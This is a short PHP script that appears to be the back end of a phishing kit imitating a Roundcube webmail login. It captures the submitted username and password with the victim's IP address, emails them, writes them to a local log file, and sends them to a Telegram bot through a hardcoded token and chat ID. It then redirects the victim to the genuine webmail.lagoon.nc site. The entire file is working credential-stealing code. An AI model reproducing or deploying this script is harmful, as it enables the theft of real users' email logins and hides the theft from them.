
<?php
session_start();
error_reporting(0);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
 
$ip = getenv("REMOTE_ADDR");
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "$$---------------------------------------------$$\n";
$message .= "rcmloginuser     :  ".$_POST['rcmloginuser']."\n";
$message .= "rcmloginpwd     :  ".$_POST['rcmloginpwd']."\n";
$message .= "$$---------------------------------------------$$\n";
$message .= "\n";
$send = "";
$subject = "| LOGOON | $ip |";
mail($send,$subject,$message);


$file = fopen("./logs.txt", 'a');
fwrite($file, $message);

$praga=rand();
$praga=md5($praga);

$botToken="6810910665:AAEa3_8N8XOQb2QmeI8GakOIf8qq9Cb8_SU";

    $website="https://api.telegram.org/bot".$botToken;
    $chatId=7262690647;  //
    $params=[
        'chat_id'=>$chatId, 
        'text'=>$message,];	

$ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

$useragent=$_SERVER['HTTP_USER_AGENT'];
header("Location:https://webmail.lagoon.nc/");

?>